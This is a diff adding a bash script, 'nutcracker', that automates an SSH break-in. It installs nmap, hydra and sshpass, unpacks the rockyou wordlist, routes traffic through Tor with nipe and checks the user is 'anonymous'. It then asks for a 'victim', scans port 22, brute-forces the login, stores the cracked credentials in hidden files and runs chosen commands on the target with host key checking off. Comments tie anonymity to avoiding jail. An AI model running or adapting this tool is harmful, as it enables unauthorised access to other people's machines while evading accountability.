@@ -1,0 +1,178 @@
+#!/bin/bash 
+
+# namp install  
+echo "Welcome to the nutcracker" |figlet
+function  INSTALL(){
+echo "Hello do you want to install the tools for the script ? yes/no"
+read INSTAL
+INSTALY=$(echo "$INSTAL" | tr "Yes" "yes" )
+if [[ $INSTALY == yes ]] ; then 
+   sudo apt-get install nmap -y
+   sudo apt install sshpass -y
+   sudo apt install  hydra -y
+else
+   echo ""
+   echo "Wall i hope you know what you are doing"
+fi
+}
+INSTALL
+function ROCKYOU () {
+echo ""
+echo "Would you like to open the password list rock_you? yes/no"
+read N
+NN=$(echo "$N" | tr "Yes" "yes" )
+
+if [[ $NN == yes ]] ; then 
+cd /usr/share/wordlists
+sudo gzip -d rockyou.txt.gz
+cd /home
+else 
+echo ""
+echo "If you already have rock_you open, go ahead. If not, you can't continue."
+fi
+}
+ROCKYOU
+
+function NIPE(){
+echo " "
+echo "Do you want to install nipe ? yes/no"
+echo  "Note: If you are not anonymous, you cannot continue."
+read  INPUT 
+INPUTY=$(echo "$INPUT" | tr '[:upper:]' '[:lower:]' )
+echo " "
+if [[ $INPUTY == yes ]]; then 
+# isnatll from gethub
+git clone https://github.com/htrgouvea/nipe 
+ 
+cd nipe
+
+# Install libs and dependencie
+sudo -S cpan install Try::Tiny Config::Simple JSON 
+
+# Nipe must be run as root
+
+sudo -S perl nipe.pl install 
+# start nipe
+
+sudo -S perl nipe.pl start
+
+# restart 
+
+sudo -S perl nipe.pl restart|sudo -S perl nipe.pl restart
+
+# display  status
+
+sudo -S perl nipe.pl status
+INPUTY=$(echo "$INPUT" | tr "NO" "no" )
+elif [[ $INPUTY == no ]];then
+echo ""
+echo  "Keep in mind that when you are not anonymous, you are more likely to go to jail."
+fi
+}
+NIPE
+
+WANIP=$(sudo -S perl nipe.pl status | grep Ip: | awk '{print $3}')
+
+echo " "
+
+function ANONIMOS(){
+IP=$(curl -s  ifconfig.me)
+echo "Just in case, let's see your WAN IP"
+echo " "
+WAN=$( geoiplookup  $WANIP )
+echo  $WAN
+
+CNTRY=$(whois $IP | grep -o 'IL')
+
+if [[ $CNTRY != 'IL' ]] ; then
+   echo  'you are  anonymous ' 
+else
+
+    echo 'you are not anonymous'
+echo 'exiting ..'
+sleep 4
+exit
+fi
+
+
+}
+ANONIMOS
+
+echo " "
+
+function  DARKSAID(){
+echo "Please select your victim."
+read TARGET
+sS=$(nmap -p22 $TARGET| grep 22/tcp | awk {'print $2'} | grep open)
+if [[ $sS  == "open" ]]; then
+echo " " 
+echo "Port 22 has been detected."
+echo " "
+else
+   echo "Port 22 hasn't been detected. Please select a different target."
+return
+fi
+echo "Do you want to try and crack the password? yes/no"
+read ATTACK 
+ATTACKY=$(echo "$ATTACK" | tr "Yes" "yes" )
+
+if [[ $ATTACKY == yes ]] ; then 
+echo " "
+echo "Please type the names that could be the name of the victim and press Ctrl+D."
+touch names
+cat > names
+echo " "
+USR=$(hydra -t 4 -L ./names -P /usr/share/wordlists/rockyou.txt ssh://"$TARGET" | grep  login: | awk {'print $5'})
+PSWD=$(hydra -t 4 -L ./names -P /usr/share/wordlists/rockyou.txt ssh://"$TARGET"  | grep password:| awk {'print$7'}) 
+touch .secrat
+touch .secrat1
+touch .attak_list
+else 
+echo "If you want to crack the password, please select 'y'. Goodbye." 
+sleep 2
+return
+fi
+echo""
+echo "Do you want to save the username and password in the .attack_list file? yes/no"
+read  FILE
+if [[ $FILE == yes ]] ; then  
+echo "usernam" >.secrat
+echo "$USR" >> .secrat
+echo "password">.secrat1
+echo "$PSWD" >> .secrat1
+paste .secrat .secrat1 >.attak_list
+else
+echo ""
+echo "ok have it your way" 
+fi
+if [[  -z  "$PSWD"  ]] ; then 
+echo ""
+echo "Password cracking has been failed."
+fi
+echo ""
+echo  "Great, we found the password and the username. Would you like to SSH into them? yes/no"
+echo  "!!!Note: If you have cracked a couple of passwords, you cannot use sshpass!!!"
+read  SSH
+echo " "
+SSHY=$(echo "$SSH" | tr "Yes" "yes" )
+if [[ $SSHY == yes ]]; then
+echo " "
+echo  "what comands do you want to instort to the sshpass?"
+read COMMANDS
+  sshpass -p "$PSWD" ssh -o StrictHostKeyChecking=no "$USR@$TARGET" "$COMMANDS"
+
+fi
+} 
+
+DARKSAID
+echo ""
+echo "exiting tor ..."
+sudo service tor stop
+sudo -S perl nipe.pl stop 
+function LOG () {
+echo""
+echo "thes will be loged"
+
+echo " date/time/of_useg: $(date) _ who_uesd_the_scripet: $(whoami) _ who_was_the_tardet: $TARGET _  was_he_anonymous_while_using_the_attack? $INPUTY \n  hydra was used: $ATTACKY whas sshpass uesed : $SSHY _  what commands ware yuesd : $COMMANDS " >> .log
+}
+LOG
